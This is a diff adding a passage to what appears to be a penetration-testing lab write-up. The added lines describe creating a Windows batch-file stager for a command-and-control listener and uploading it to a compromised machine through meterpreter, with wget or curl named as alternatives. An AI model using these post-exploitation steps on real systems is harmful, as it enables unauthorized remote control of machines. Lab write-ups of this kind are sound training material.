@@ -88,3 +88,10 @@ lets also create a stager
 + create stager
 + type: windows/launcher_bat
 + listener: oneMadeFromAbove
+
+once that was created i downloaded the stager and uploaded to the remote machine using meterpreter
+```bash
+upload ~/Documents/launcher.bat
+```
+
+we could have also used `wget` or `curl` or a different route to get the batch file into the remote machine
